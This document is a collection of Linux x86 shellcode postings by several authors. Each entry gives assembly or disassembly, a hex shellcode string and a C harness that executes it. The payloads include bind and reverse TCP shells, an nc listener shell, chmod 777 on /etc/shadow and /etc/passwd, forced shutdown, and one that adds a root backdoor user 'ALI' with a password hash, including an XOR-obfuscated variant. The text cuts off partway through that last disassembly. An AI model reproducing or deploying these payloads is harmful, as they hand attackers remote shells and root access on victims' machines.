;Shellcode:     \xd9\xee\xeb\x34\xeb\x25\x5e\x89\xf7\x31\xc0\x50\x89\xe2\x50\x83\xc4\x03\x8d\x76\x04\x33\x06\x50\x31\xc0\x33\x07\x50\x89\xe3\x31\xc0\x50\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x9b\xd9\x74\x24\xf4\x59\x8d\x41\x04\xff\xe0
;Author:        Paolo Stivanin <https://github.com/polslinux>
;SLAE ID:       526

global main
section .text
main:
    fldz
    jmp short here
message: db 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68
here:   fstenv [esp-0xc]
    pop ecx
    lea eax,[ecx+4]
    jmp eax



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
# Linux x86 /bin/nc -le /bin/sh -vp 17771 shellcode
# This shellcode will listen on port 17771 and give you /bin/sh
# Date: 31.05.2014
# Shellcode Author: Oleg Boytsev
# Tested on: Debian GNU/Linux 7/i686
# Shellcode Length: 58
# For education purpose only

global _start
section .text
 _start:
    xor eax, eax
    xor edx, edx
    push eax
    push 0x31373737     ;-vp17771
    push 0x3170762d
    mov esi, esp

    push eax
    push 0x68732f2f     ;-le//bin//sh
    push 0x6e69622f
    push 0x2f656c2d
    mov edi, esp

    push eax
    push 0x636e2f2f     ;/bin//nc
    push 0x6e69622f
    mov ebx, esp

    push edx
    push esi
    push edi
    push ebx
    mov ecx, esp
    mov al,11
    int 0x80
*/

#include <stdio.h>
#include <string.h>

unsigned char shellcode[] =
"\x31\xc0\x31\xd2\x50\x68\x37\x37\x37\x31\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80";


main()
{
        printf("Shellcode Length: %d\n",strlen(shellcode));
        int (*ret)() = (int(*)())shellcode;
        ret();
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
; Title:    chmod 0777 /etc/shadow (a bit obfuscated) Shellcode - 51 Bytes
; Platform: linux/x86
; Date:     2014-06-22
; Author:   Osanda Malith Jayathissa (@OsandaMalith)

section .text
global _start

_start: 
mov ebx, eax
xor eax, ebx
push dword eax
mov esi, 0x563a1f3e
add esi, 0x21354523
mov dword [esp-4], esi
mov dword [esp-8], 0x68732f2f
mov dword [esp-12], 0x6374652f
sub esp, 12
mov    ebx,esp
push word  0x1ff
pop    cx
mov    al,0xf
int    0x80

*/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x89\xc3\x31\xd8\x50\xbe\x3e\x1f"
"\x3a\x56\x81\xc6\x23\x45\x35\x21"
"\x89\x74\x24\xfc\xc7\x44\x24\xf8"
"\x2f\x2f\x73\x68\xc7\x44\x24\xf4"
"\x2f\x65\x74\x63\x83\xec\x0c\x89"
"\xe3\x66\x68\xff\x01\x66\x59\xb0"
"\x0f\xcd\x80";

int
main() {

       printf("Shellcode Length:  %d\n", strlen(code));
       int (*ret)() = (int(*)())code;
       ret();

return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
; Title: shutdown -h now Shellcode - 56 bytes
; Date: 2014-06-27
; Platform: linux/x86
; Author: Osanda Malith Jayathissa (@OsandaMalith)

Disassembly of section .text:

08048060 <_start>:
8048060:    31 c0                   xor    eax,eax
8048062:    31 d2                   xor    edx,edx
8048064:    50                      push   eax
8048065:    66 68 2d 68             pushw  0x682d
8048069:    89 e7                   mov    edi,esp
804806b:    50                      push   eax
804806c:    6a 6e                   push   0x6e
804806e:    66 c7 44 24 01 6f 77    mov    WORD PTR [esp+0x1],0x776f
8048075:    89 e7                   mov    edi,esp
8048077:    50                      push   eax
8048078:    68 64 6f 77 6e          push   0x6e776f64
804807d:    68 73 68 75 74          push   0x74756873
8048082:    68 6e 2f 2f 2f          push   0x2f2f2f6e
8048087:    68 2f 73 62 69          push   0x6962732f
804808c:    89 e3                   mov    ebx,esp
804808e:    52                      push   edx
804808f:    56                      push   esi
8048090:    57                      push   edi
8048091:    53                      push   ebx
8048092:    89 e1                   mov    ecx,esp
8048094:    b0 0b                   mov    al,0xb
8048096:    cd 80                   int    0x80

*/

#include <stdio.h>
#include <string.h>

unsigned char code[] =  "\x31\xc0\x31\xd2\x50\x66\x68\x2d"
"\x68\x89\xe7\x50\x6a\x6e\x66\xc7"
"\x44\x24\x01\x6f\x77\x89\xe7\x50"
"\x68\x64\x6f\x77\x6e\x68\x73\x68"
"\x75\x74\x68\x6e\x2f\x2f\x2f\x68"
"\x2f\x73\x62\x69\x89\xe3\x52\x56"
"\x57\x53\x89\xe1\xb0\x0b\xcd\x80";

int
main() {

printf("Shellcode Length:  %d\n", (int)strlen(code));
int (*ret)() = (int(*)())code;
ret();

return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* Socket Re-use Combo for linux x86 systems by ZadYree -- 50 bytes
* <zadyree@tuxfamily.org>
*
* Made using sockfd trick + dup2(0,0), dup2(0,1), dup2(0,2) +
* execve /bin/sh
*
* Thanks: Charles Stevenson, ipv, 3LRVS research team
*
* gcc -o socket_reuse socket_reuse.c -z execstack
*/

char shellcode[]= /* We use sys_dup(2) to get the previous attributed sockfd */
"\x6a\x02"      // push 0x2
"\x5b"          // pop ebx
"\x6a\x29"      // push 0x29
"\x58"          // pop eax
"\xcd\x80"      // int 0x80 -> call dup(2)
"\x48"          // dec eax
/* Now EAX = our Socket File Descriptor */

"\x89\xc6"      // mov esi, eax

/* dup2(fd,0); dup2(fd,1); dup2(fd,2); */
"\x31\xc9"                  // xor    %ecx,%ecx
"\x56"                      // push   %esi
"\x5b"                      // pop    %ebx
// loop:
"\x6a\x3f"                  // push   $0x3f
"\x58"                      // pop    %eax
"\xcd\x80"                  // int    $0x80
"\x41"                      // inc    %ecx
"\x80\xf9\x03"              // cmp    $0x3,%cl
"\x75\xf5"                  // jne    80483e8 <loop>

/* execve /bin/sh by ipv */
"\x6a\x0b"                  // push byte 0xb
"\x58"                      // pop eax
"\x99"                      // cdq
"\x52"                      // push edx
"\x31\xf6"                  // xor esi, esi - We add those instructions
"\x56"                      // push esi     - to clean up the arg stack
"\x68\x2f\x2f\x73\x68"      // push dword 0x68732f2f
"\x68\x2f\x62\x69\x6e"      // push dword 0x6e69922f
"\x89\xe3"                  // mov ebx, esp
"\x31\xc9"                  // xor ecx, ecx
"\xcd\x80";                 // int 0x80
;

/* 

shellcode[]=
"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x31\xc9\xcd\x80";

*/


int main(void)
{
 printf("Shellcode length: %d\n", strlen(shellcode));
 (*(void(*)()) shellcode)();  
 return 0;
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* 
*  Title:    Shell Bind TCP Shellcode Port 1337 - 89 bytes
*  Platform: Linux/x86
*  Date:     2014-07-13
*  Author:   Julien Ahrens (@MrTuxracer)
*  Website:  http://www.rcesecurity.com 
*
*  Disassembly of section .text:
*  00000000 <_start>:
*  0:   6a 66                push   0x66
*  2:   58                   pop    eax
*  3:   6a 01                push   0x1
*  5:   5b                   pop    ebx
*  6:   31 f6                xor    esi,esi
*  8:   56                   push   esi
*  9:   53                   push   ebx
*  a:   6a 02                push   0x2
*  c:   89 e1                mov    ecx,esp
*  e:   cd 80                int    0x80
* 10:   5f                   pop    edi
* 11:   97                   xchg   edi,eax
* 12:   93                   xchg   ebx,eax
* 13:   b0 66                mov    al,0x66
* 15:   56                   push   esi
* 16:   66 68 05 39          pushw  0x3905
* 1a:   66 53                push   bx
* 1c:   89 e1                mov    ecx,esp
* 1e:   6a 10                push   0x10
* 20:   51                   push   ecx
* 21:   57                   push   edi
* 22:   89 e1                mov    ecx,esp
* 24:   cd 80                int    0x80
* 26:   b0 66                mov    al,0x66
* 28:   b3 04                mov    bl,0x4
* 2a:   56                   push   esi
* 2b:   57                   push   edi
* 2c:   89 e1                mov    ecx,esp
* 2e:   cd 80                int    0x80
* 30:   b0 66                mov    al,0x66
* 32:   43                   inc    ebx
* 33:   56                   push   esi
* 34:   56                   push   esi
* 35:   57                   push   edi
* 36:   89 e1                mov    ecx,esp
* 38:   cd 80                int    0x80
* 3a:   59                   pop    ecx
* 3b:   59                   pop    ecx
* 3c:   b1 02                mov    cl,0x2
* 3e:   93                   xchg   ebx,eax
*
* 0000003f <loop>:
* 3f:   b0 3f                mov    al,0x3f
* 41:   cd 80                int    0x80
* 43:   49                   dec    ecx
* 44:   79 f9                jns    3f <loop>
* 46:   b0 0b                mov    al,0xb
* 48:   68 2f 2f 73 68       push   0x68732f2f
* 4d:   68 2f 62 69 6e       push   0x6e69622f
* 52:   89 e3                mov    ebx,esp
* 54:   41                   inc    ecx
* 55:   89 ca                mov    edx,ecx
* 57:   cd 80                int    0x80
*/

#include <stdio.h>

unsigned char shellcode[] = \
"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80";

main()
{
printf("Shellcode Length:  %d\n", sizeof(shellcode) - 1);
int (*ret)() = (int(*)())shellcode;
ret();
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* 
*  Title:    Shell Reverse TCP Shellcode - 74 bytes
*  Platform: Linux/x86
*  Date:     2014-07-25
*  Author:   Julien Ahrens (@MrTuxracer)
*  Website:  http://www.rcesecurity.com 
*
* Disassembly of section .text:
*  00000000 <_start>:
*  0:   6a 66                push   0x66
*  2:   58                   pop    eax
*  3:   6a 01                push   0x1
*  5:   5b                   pop    ebx
*  6:   31 d2                xor    edx,edx
*  8:   52                   push   edx
*  9:   53                   push   ebx
*  a:   6a 02                push   0x2
*  c:   89 e1                mov    ecx,esp
*  e:   cd 80                int    0x80
* 10:   92                   xchg   edx,eax
* 11:   b0 66                mov    al,0x66
* 13:   68 7f 01 01 01       push   0x101017f <ip: 127.1.1.1
* 18:   66 68 05 39          pushw  0x3905 <port: 1337
* 1c:   43                   inc    ebx
* 1d:   66 53                push   bx
* 1f:   89 e1                mov    ecx,esp
* 21:   6a 10                push   0x10
* 23:   51                   push   ecx
* 24:   52                   push   edx
* 25:   89 e1                mov    ecx,esp
* 27:   43                   inc    ebx
* 28:   cd 80                int    0x80
* 2a:   6a 02                push   0x2
* 2c:   59                   pop    ecx
* 2d:   87 da                xchg   edx,ebx
*
* 0000002f <loop>:
* 2f:   b0 3f                mov    al,0x3f
* 31:   cd 80                int    0x80
* 33:   49                   dec    ecx
* 34:   79 f9                jns    2f <loop>
* 36:   b0 0b                mov    al,0xb
* 38:   41                   inc    ecx
* 39:   89 ca                mov    edx,ecx
* 3b:   52                   push   edx
* 3c:   68 2f 2f 73 68       push   0x68732f2f
* 41:   68 2f 62 69 6e       push   0x6e69622f
* 46:   89 e3                mov    ebx,esp
* 48:   cd 80                int    0x80
*/

#include <stdio.h>

unsigned char shellcode[] = \
"\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

main()
{
printf("Shellcode Length:  %d\n", sizeof(shellcode) - 1);
int (*ret)() = (int(*)())shellcode;
ret();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

# Title: Shellcode Linux x86 [378 bytes] chmod(777 /etc/passwd and /etc/shadow) && (Add new root user [ALI] with password [ALI] for ssh) && Execute /bin/sh 
# Date: August05 - 2014
# Author: Ali Razmjoo
# Tested on: kali-linux-1.0.4-i386 [3.7-trunk-686-pae #1 SMP Debian 3.7.2-0+kali8 i686 GNU/Linux ]

/*
Ali Razmjoo , Ali.Razmjoo1994@Gmail.Com
Shellcode Linux x86 chmod(777 /etc/passwd and /etc/shadow) && (Add new root user [ALI] with password [ALI] for ssh) && Setreuid() , Execute /bin/sh 
length: 378 bytes
chmod('/etc/passwd',777)
chmod('/etc/shadow',777)
open passwd , and write new root user with passwrd ( user: ALI pass: ALI ) , close passwd
setreuid() , execve('/bin/sh')


00000000 <_start>:
   0:   31 c0                   xor    %eax,%eax
   2:   31 db                   xor    %ebx,%ebx
   4:   6a 0f                   push   $0xf
   6:   58                      pop    %eax
   7:   68 6a 73 77 64          push   $0x6477736a
   c:   5b                      pop    %ebx
   d:   c1 eb 08                shr    $0x8,%ebx
  10:   53                      push   %ebx
  11:   68 2f 70 61 73          push   $0x7361702f
  16:   68 2f 65 74 63          push   $0x6374652f
  1b:   89 e3                   mov    %esp,%ebx
  1d:   68 41 41 ff 01          push   $0x1ff4141
  22:   59                      pop    %ecx
  23:   c1 e9 08                shr    $0x8,%ecx
  26:   c1 e9 08                shr    $0x8,%ecx
  29:   cd 80                   int    $0x80
  2b:   6a 0f                   push   $0xf
  2d:   58                      pop    %eax
  2e:   68 6a 64 6f 77          push   $0x776f646a
  33:   5b                      pop    %ebx
  34:   c1 eb 08                shr    $0x8,%ebx
  37:   53                      push   %ebx
  38:   68 2f 73 68 61          push   $0x6168732f
  3d:   68 2f 65 74 63          push   $0x6374652f
  42:   89 e3                   mov    %esp,%ebx
  44:   68 41 41 ff 01          push   $0x1ff4141
  49:   59                      pop    %ecx
  4a:   c1 e9 08                shr    $0x8,%ecx
  4d:   c1 e9 08                shr    $0x8,%ecx
  50:   cd 80                   int    $0x80
  52:   6a 05                   push   $0x5
  54:   58                      pop    %eax
  55:   68 41 73 77 64          push   $0x64777341
  5a:   5b                      pop    %ebx
  5b:   c1 eb 08                shr    $0x8,%ebx
  5e:   53                      push   %ebx
  5f:   68 2f 70 61 73          push   $0x7361702f
  64:   68 2f 65 74 63          push   $0x6374652f
  69:   89 e3                   mov    %esp,%ebx
  6b:   68 41 41 01 04          push   $0x4014141
  70:   59                      pop    %ecx
  71:   c1 e9 08                shr    $0x8,%ecx
  74:   c1 e9 08                shr    $0x8,%ecx
  77:   cd 80                   int    $0x80
  79:   89 c3                   mov    %eax,%ebx
  7b:   6a 04                   push   $0x4
  7d:   58                      pop    %eax
  7e:   68 41 73 68 0a          push   $0xa687341
  83:   59                      pop    %ecx
  84:   c1 e9 08                shr    $0x8,%ecx
  87:   51                      push   %ecx
  88:   68 6e 2f 62 61          push   $0x61622f6e
  8d:   68 3a 2f 62 69          push   $0x69622f3a
  92:   68 72 6f 6f 74          push   $0x746f6f72
  97:   68 4c 49 3a 2f          push   $0x2f3a494c
  9c:   68 3a 30 3a 41          push   $0x413a303a
  a1:   68 4b 2e 3a 30          push   $0x303a2e4b
  a6:   68 66 77 55 57          push   $0x57557766
  ab:   68 68 70 31 50          push   $0x50317068
  b0:   68 7a 59 65 41          push   $0x4165597a
  b5:   68 41 61 41 51          push   $0x51416141
  ba:   68 49 38 75 74          push   $0x74753849
  bf:   68 50 4d 59 68          push   $0x68594d50
  c4:   68 54 42 74 7a          push   $0x7a744254
  c9:   68 51 2f 38 54          push   $0x54382f51
  ce:   68 45 36 6d 67          push   $0x676d3645
  d3:   68 76 50 2e 73          push   $0x732e5076
  d8:   68 4e 58 52 37          push   $0x3752584e
  dd:   68 39 4b 55 48          push   $0x48554b39
  e2:   68 72 2f 59 42          push   $0x42592f72
  e7:   68 56 78 4b 47          push   $0x474b7856
  ec:   68 39 55 66 5a          push   $0x5a665539
  f1:   68 46 56 6a 68          push   $0x686a5646
  f6:   68 46 63 38 79          push   $0x79386346
  fb:   68 70 59 6a 71          push   $0x716a5970
 100:   68 77 69 53 68          push   $0x68536977
 105:   68 6e 54 67 54          push   $0x5467546e
 10a:   68 58 4d 69 37          push   $0x37694d58
 10f:   68 2f 41 6e 24          push   $0x246e412f
 114:   68 70 55 6e 4d          push   $0x4d6e5570
 119:   68 24 36 24 6a          push   $0x6a243624
 11e:   68 41 4c 49 3a          push   $0x3a494c41
 123:   89 e1                   mov    %esp,%ecx
 125:   ba 41 41 41 7f          mov    $0x7f414141,%edx
 12a:   c1 ea 08                shr    $0x8,%edx
 12d:   c1 ea 08                shr    $0x8,%edx
 130:   c1 ea 08                shr    $0x8,%edx
 133:   cd 80                   int    $0x80
 135:   31 c0                   xor    %eax,%eax
 137:   b0 46                   mov    $0x46,%al
 139:   31 db                   xor    %ebx,%ebx
 13b:   31 c9                   xor    %ecx,%ecx
 13d:   cd 80                   int    $0x80
 13f:   31 c0                   xor    %eax,%eax
 141:   b0 46                   mov    $0x46,%al
 143:   31 db                   xor    %ebx,%ebx
 145:   31 c9                   xor    %ecx,%ecx
 147:   cd 80                   int    $0x80
 149:   68 59 59 59 59          push   $0x59595959
 14e:   68 58 58 58 58          push   $0x58585858
 153:   68 2f 73 68 42          push   $0x4268732f
 158:   68 2f 62 69 6e          push   $0x6e69622f
 15d:   89 e3                   mov    %esp,%ebx
 15f:   31 c0                   xor    %eax,%eax
 161:   88 43 07                mov    %al,0x7(%ebx)
 164:   89 5b 08                mov    %ebx,0x8(%ebx)
 167:   89 43 0c                mov    %eax,0xc(%ebx)
 16a:   b0 0b                   mov    $0xb,%al
 16c:   8d 4b 08                lea    0x8(%ebx),%ecx
 16f:   8d 53 0c                lea    0xc(%ebx),%edx
 172:   cd 80                   int    $0x80
 174:   b0 01                   mov    $0x1,%al
 176:   b3 01                   mov    $0x1,%bl
 178:   cd 80                   int    $0x80

*/

#include <stdio.h>
#include <string.h>

char sc[] = "\x31\xc0\x31\xdb\x6a\x0f\x58\x68\x6a\x73\x77\x64\x5b\xc1\xeb\x08\x53\x68\x2f\x70\x61\x73\x68\x2f\x65\x74\x63\x89\xe3\x68\x41\x41\xff\x01\x59\xc1\xe9\x08\xc1\xe9\x08\xcd\x80\x6a\x0f\x58\x68\x6a\x64\x6f\x77\x5b\xc1\xeb\x08\x53\x68\x2f\x73\x68\x61\x68\x2f\x65\x74\x63\x89\xe3\x68\x41\x41\xff\x01\x59\xc1\xe9\x08\xc1\xe9\x08\xcd\x80\x6a\x05\x58\x68\x41\x73\x77\x64\x5b\xc1\xeb\x08\x53\x68\x2f\x70\x61\x73\x68\x2f\x65\x74\x63\x89\xe3\x68\x41\x41\x01\x04\x59\xc1\xe9\x08\xc1\xe9\x08\xcd\x80\x89\xc3\x6a\x04\x58\x68\x41\x73\x68\x0a\x59\xc1\xe9\x08\x51\x68\x6e\x2f\x62\x61\x68\x3a\x2f\x62\x69\x68\x72\x6f\x6f\x74\x68\x4c\x49\x3a\x2f\x68\x3a\x30\x3a\x41\x68\x4b\x2e\x3a\x30\x68\x66\x77\x55\x57\x68\x68\x70\x31\x50\x68\x7a\x59\x65\x41\x68\x41\x61\x41\x51\x68\x49\x38\x75\x74\x68\x50\x4d\x59\x68\x68\x54\x42\x74\x7a\x68\x51\x2f\x38\x54\x68\x45\x36\x6d\x67\x68\x76\x50\x2e\x73\x68\x4e\x58\x52\x37\x68\x39\x4b\x55\x48\x68\x72\x2f\x59\x42\x68\x56\x78\x4b\x47\x68\x39\x55\x66\x5a\x68\x46\x56\x6a\x68\x68\x46\x63\x38\x79\x68\x70\x59\x6a\x71\x68\x77\x69\x53\x68\x68\x6e\x54\x67\x54\x68\x58\x4d\x69\x37\x68\x2f\x41\x6e\x24\x68\x70\x55\x6e\x4d\x68\x24\x36\x24\x6a\x68\x41\x4c\x49\x3a\x89\xe1\xba\x41\x41\x41\x7f\xc1\xea\x08\xc1\xea\x08\xc1\xea\x08\xcd\x80\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\x68\x59\x59\x59\x59\x68\x58\x58\x58\x58\x68\x2f\x73\x68\x42\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xb0\x01\xb3\x01\xcd\x80";

int main(void)
{

    fprintf(stdout,"Length: %d\n\n",strlen(sc));

    (*(void(*)()) sc)();

}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

# Title: Shellcode Linux x86 [54Bytes] Run /usr/bin/python | setreuid(),execve()
# Date: 8/5/2014
# Author: Ali Razmjoo
# Tested on: kali-linux-1.0.4-i386 [3.7-trunk-686-pae #1 SMP Debian 3.7.2-0+kali8 i686 GNU/Linux ]

/*
Ali Razmjoo , Ali.Razmjoo1994@Gmail.Com
Shellcode Linux x86 Run /usr/bin/python | setreuid(),execve()
Shellcode Length: 54


00000000 <_start>:
   0:   31 c0                   xor    %eax,%eax
   2:   b0 46                   mov    $0x46,%al
   4:   31 db                   xor    %ebx,%ebx
   6:   31 c9                   xor    %ecx,%ecx
   8:   cd 80                   int    $0x80
   a:   eb 16                   jmp    22 <last>
0000000c <first>:
   c:   5b                      pop    %ebx
   d:   31 c0                   xor    %eax,%eax
   f:   88 43 0f                mov    %al,0xf(%ebx)
  12:   89 5b 10                mov    %ebx,0x10(%ebx)
  15:   89 43 14                mov    %eax,0x14(%ebx)
  18:   b0 0b                   mov    $0xb,%al
  1a:   8d 4b 10                lea    0x10(%ebx),%ecx
  1d:   8d 53 14                lea    0x14(%ebx),%edx
  20:   cd 80                   int    $0x80
00000022 <last>:
  22:   e8 e5 ff ff ff          call   c <first>
  27:   2f                      das
  28:   75 73                   jne    9d <last+0x7b>
  2a:   72 2f                   jb     5b <last+0x39>
  2c:   62 69 6e                bound  %ebp,0x6e(%ecx)
  2f:   2f                      das
  30:   70 79                   jo     ab <last+0x89>
  32:   74 68                   je     9c <last+0x7a>
  34:   6f                      outsl  %ds:(%esi),(%dx)
  35:   6e                      outsb  %ds:(%esi),(%dx)
*/

#include <stdio.h>
#include <string.h>

char sc[] = "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x0f\x89\x5b\x10\x89\x43\x14\xb0\x0b\x8d\x4b\x10\x8d\x53\x14\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x79\x74\x68\x6f\x6e";

int main(void)
{
    fprintf(stdout,"Length: %d\n\n",strlen(sc));
    (*(void(*)()) sc)();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Obfuscated Shellcode Linux x86 chmod(777 /etc/passwd and /etc/shadow) && (Add new root user [ALI] with password [ALI] for ssh) && Setreuid() , Execute /bin/sh 
length: 521 bytes


Ali Razmjoo , Ali.Razmjoo1994@Gmail.Com

# Tested on: kali-linux-1.0.4-i386 [3.7-trunk-686-pae #1 SMP Debian 3.7.2-0+kali8 i686 GNU/Linux ]

chmod('/etc/passwd',777)
chmod('/etc/shadow',777)
open passwd , and write new root user with passwrd ( user: ALI pass: ALI ) , close passwd
setreuid() , execve('/bin/sh')


root@user:~/Desktop/xpl# objdump -d f.o

f.o:     file format elf32-i386


Disassembly of section .text:

00000000 <_start>:
   0:   31 c0                   xor    %eax,%eax
   2:   31 db                   xor    %ebx,%ebx
   4:   31 c9                   xor    %ecx,%ecx
   6:   31 d2                   xor    %edx,%edx
   8:   bb 59 45 4f 53          mov    $0x534f4559,%ebx
   d:   ba 33 36 38 37          mov    $0x37383633,%edx
  12:   31 d3                   xor    %edx,%ebx
  14:   53                      push   %ebx
  15:   c1 eb 08                shr    $0x8,%ebx
  18:   53                      push   %ebx
  19:   bb 7a 46 59 45          mov    $0x4559467a,%ebx
  1e:   ba 55 36 38 36          mov    $0x36383655,%edx
  23:   31 d3                   xor    %edx,%ebx
  25:   53                      push   %ebx
  26:   bb 67 58 45 4e          mov    $0x4e455867,%ebx
  2b:   ba 48 3d 31 2d          mov    $0x2d313d48,%edx
  30:   31 d3                   xor    %edx,%ebx
  32:   53                      push   %ebx
  33:   89 e3                   mov    %esp,%ebx
  35:   68 41 41 ff 01          push   $0x1ff4141
  3a:   59                      pop    %ecx
  3b:   c1 e9 08                shr    $0x8,%ecx
  3e:   c1 e9 08                shr    $0x8,%ecx
  41:   6a 0f                   push   $0xf
  43:   58                      pop    %eax
  44:   cd 80                   int    $0x80
  46:   bb 53 49 57 4a          mov    $0x4a574953,%ebx
  4b:   ba 39 2d 38 3d          mov    $0x3d382d39,%edx
  50:   31 d3                   xor    %edx,%ebx
  52:   c1 eb 08                shr    $0x8,%ebx
  55:   53                      push   %ebx
  56:   bb 6d 47 45 58          mov    $0x5845476d,%ebx
  5b:   ba 42 34 2d 39          mov    $0x392d3442,%edx
  60:   31 d3                   xor    %edx,%ebx
  62:   53                      push   %ebx
  63:   bb 6e 54 49 57          mov    $0x5749546e,%ebx
  68:   ba 41 31 3d 34          mov    $0x343d3141,%edx
  6d:   31 d3                   xor    %edx,%ebx
  6f:   53                      push   %ebx
  70:   89 e3                   mov    %esp,%ebx
  72:   68 41 41 ff 01          push   $0x1ff4141
  77:   59                      pop    %ecx
  78:   c1 e9 08                shr    $0x8,%ecx
  7b:   c1 e9 08                shr    $0x8,%ecx
  7e:   6a 0f                   push   $0xf
  80:   58                      pop    %eax
  81:   cd 80                   int    $0x80
  83:   bb 73 47 4e 51          mov    $0x514e4773,%ebx
  88:   ba 32 34 39 35          mov    $0x35393432,%edx
  8d:   31 d3                   xor    %edx,%ebx
  8f:   c1 eb 08                shr    $0x8,%ebx
  92:   53                      push   %ebx
  93:   bb 59 44 56 44          mov    $0x44564459,%ebx
  98:   ba 76 34 37 37          mov    $0x37373476,%edx
  9d:   31 d3                   xor    %edx,%ebx
  9f:   53                      push   %ebx
  a0:   bb 4e 58 59 51          mov    $0x5159584e,%ebx
  a5:   ba 61 3d 2d 32          mov    $0x322d3d61,%edx
  aa:   31 d3                   xor    %edx,%ebx
  ac:   53                      push   %ebx
  ad:   89 e3                   mov    %esp,%ebx
  af:   68 41 41 01 04          push   $0x4014141
  b4:   59                      pop    %ecx
  b5:   c1 e9 08                shr    $0x8,%ecx
  b8:   c1 e9 08                shr    $0x8,%ecx
  bb:   6a 05                   push   $0x5
  bd:   58                      pop    %eax
  be:   cd 80                   int    $0x80
  c0:   89 c3                   mov    %eax,%ebx
  c2:   6a 04                   push   $0x4
  c4:   58                      pop    %eax
  c5:   68 41 73 68 0a          push   $0xa687341
  ca:   59                      pop    %ecx
  cb:   c1 e9 08                shr    $0x8,%ecx
  ce:   51                      push   %ecx
  cf:   b9 57 67 57 58          mov    $0x58576757,%ecx
  d4:   ba 39 48 35 39          mov    $0x39354839,%edx
  d9:   31 d1                   xor    %edx,%ecx
  db:   51                      push   %ecx
  dc:   b9 4e 64 5a 51          mov    $0x515a644e,%ecx
  e1:   ba 74 4b 38 38          mov    $0x38384b74,%edx
  e6:   31 d1                   xor    %edx,%ecx
  e8:   51                      push   %ecx
  e9:   b9 47 57 56 42          mov    $0x42565747,%ecx
  ee:   ba 35 38 39 36          mov    $0x36393835,%edx
  f3:   31 d1                   xor    %edx,%ecx
  f5:   51                      push   %ecx
  f6:   b9 61 70 51 4e          mov    $0x4e517061,%ecx
  fb:   ba 2d 39 6b 61          mov    $0x616b392d,%edx
 100:   31 d1                   xor    %edx,%ecx
 102:   51                      push   %ecx
 103:   b9 48 58 70 74          mov    $0x74705848,%ecx
 108:   ba 72 68 4a 35          mov    $0x354a6872,%edx
 10d:   31 d1                   xor    %edx,%ecx
 10f:   51                      push   %ecx
 110:   b9 76 45 56 46          mov    $0x46564576,%ecx
 115:   ba 3d 6b 6c 76          mov    $0x766c6b3d,%edx
 11a:   31 d1                   xor    %edx,%ecx
 11c:   51                      push   %ecx
 11d:   68 66 77 55 57          push   $0x57557766
 122:   68 68 70 31 50          push   $0x50317068
 127:   68 7a 59 65 41          push   $0x4165597a
 12c:   68 41 61 41 51          push   $0x51416141
 131:   68 49 38 75 74          push   $0x74753849
 136:   68 50 4d 59 68          push   $0x68594d50
 13b:   68 54 42 74 7a          push   $0x7a744254
 140:   68 51 2f 38 54          push   $0x54382f51
 145:   68 45 36 6d 67          push   $0x676d3645
